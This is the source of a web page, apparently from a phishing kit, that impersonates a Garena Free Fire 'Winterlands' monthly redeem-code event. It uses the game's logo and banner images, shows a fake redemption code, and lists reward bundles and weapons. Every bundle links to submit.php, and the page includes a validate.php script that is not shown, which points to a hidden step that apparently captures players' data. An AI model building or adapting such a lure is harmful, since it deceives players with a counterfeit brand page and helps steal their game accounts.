<?php
include "validate.php";
?>
<html>
<head>
<title>Free Fire - Redeem Code</title>
<meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta property="og:title" content="Free Fire Winterlands - Redeem Code"/>
<meta property="og:url" content="index.html"/>
<meta property="og:description" content="Get the free fire winterlands monthly event, redeem here"/>
<meta property="og:type" content="article"/>
<meta property="article:author" content="https://www.facebook.com/MobileLegendsGame"/>
<meta property="og:image" content="https://user-images.githubusercontent.com/49580304/102184480-5e9e0c80-3e64-11eb-8ec8-d433388ab43e.jpg"/>
<link rel="icon" type="img/png" href="http://freefiremobile-a.akamaihd.net/ffwebsite/images/app-icon.png" sizes="32x32"/>
<link rel="stylesheet" type="text/css" href="css/index.css"/>
</head>
<body>
<div class="logo">
<img src="http://freefiremobile-a.akamaihd.net/ffwebsite/images/app-icon.png" alt="Free Fire Winterlands"/>
</div>
<img class="banner" src="https://1.bp.blogspot.com/-A4yuxmO8-Ws/XhBFUOeGf8I/AAAAAAAAAlM/w1Q5xixYe4s-NV9C2Nl_C886MVAI9XEKQCLcBGAsYHQ/s1600/Banner.jpg" alt="Banner"/>
<div style="clear:both"></div>
<div class="herohead">
<center><font style="font-size:14px;color:#64ffda;">Redemption Code</font></center><br/>
<input class="code" value="BHDO K6UM SGMQ O6AS" readonly=""/>
<div class="title"><b>MONTHLY EVENT</b> | COPY REDEEM CODE</div>
<a href="submit.php" class="avatar" title="Alpha">
<img src="https://user-images.githubusercontent.com/49580304/102183984-93f62a80-3e63-11eb-8479-b0e8d9d80ac8.png" alt="BUNDLE"/>
<small>BUNDLE<br/>New Years</small>
</a>
<a href="submit.php" class="avatar" title="Alpha">
<img src="https://user-images.githubusercontent.com/49580304/102183970-8f317680-3e63-11eb-8028-84c7213c77bd.png" alt="BUNDLE"/>
<small>BUNDLE<br/>Winterlands</small>
</a>
<a href="submit.php" class="avatar" title="Estes">
<img src="https://user-images.githubusercontent.com/49580304/102183976-9193d080-3e63-11eb-9945-87157552999a.png" alt="BUNDLE"/>
<small>BUNDLE<br/>Winter Elk</small>
</a>
<a href="submit.php" class="avatar" title="Miya">
<img src="https://user-images.githubusercontent.com/49580304/102183978-92c4fd80-3e63-11eb-8baa-0c51ce395454.png" alt="SET"/>
<small>SET<br/>Grumpy old</small>
</a>
</div>
<ul class="news">
<li style="background-image:url(https://user-images.githubusercontent.com/49580304/102183983-93f62a80-3e63-11eb-9f4b-a6f3135c93c9.png)" alt="M4A1">M4A1<br/><small>A balanced rifle is suitable for all types of battles.</small></li>
<li style="background-image:url(https://user-images.githubusercontent.com/49580304/102183989-96588480-3e63-11eb-8a58-4f27f3fe908e.png)" alt="MP5">MP5<br/><small>Beyond other machine guns in terms of stability, but less effective for long distances.</small></li>
<li style="background-image:url(https://user-images.githubusercontent.com/49580304/102183988-95bfee00-3e63-11eb-94df-874ef5f1be4a.png)" alt="M1014">M1014<br/><small>Use the shotgun to destroy melee enemies quickly.</small></li>
<li style="background-image:url(https://user-images.githubusercontent.com/49580304/102183991-96f11b00-3e63-11eb-84f4-9dc335aa40f4.png)" alt="AWM">AWM<br/><small>High strength sniper rifle with long reload time.</small></li>
<li style="background-image:url(https://user-images.githubusercontent.com/49580304/102183987-95275780-3e63-11eb-9321-c1da32c25a4a.png)" alt="USP">USP<br/><small>A light gun that does not affect the user's agility.</small></li>
<li style="background-image:url(https://user-images.githubusercontent.com/49580304/102183986-948ec100-3e63-11eb-835f-a519adf030a5.png)" alt="PAN">PAN<br/><small>Great shield that protects users from anything your enemy can use.</small></li>
</ul>
</body>

</html>